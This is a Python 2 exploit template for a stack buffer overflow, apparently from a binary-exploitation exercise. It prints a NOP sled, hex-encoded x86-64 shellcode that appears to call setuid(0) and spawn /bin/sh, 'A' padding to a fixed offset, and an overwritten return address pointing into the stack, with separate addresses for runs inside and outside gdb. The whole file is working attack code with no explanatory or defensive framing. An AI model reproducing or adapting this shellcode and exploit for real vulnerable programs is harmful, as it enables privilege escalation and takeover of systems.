#!/usr/bin/python

#Template

#number of 'A's to write, must be adjusted
n=140

#number of NOPs to write
nops_count=4

#NOP sled
nopsled = '\x90' * nops_count

#Payload (shell code)
buf="\x55\x48\x89\xe5\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05\xb8\x00\x00\x00\x00\x5d\xc3"

#Padding
pad = 'A' * (n - nops_count - len(buf))

#The address to jump to inside gdb
#rip = '\x60\xde\xff\xff\xff\x7f\x00\x00'

#The address to jump to outside gdb
rip = '\xde\xe2\xff\xff\xff\x7f\x00\x00'

print nopsled + buf + pad + rip

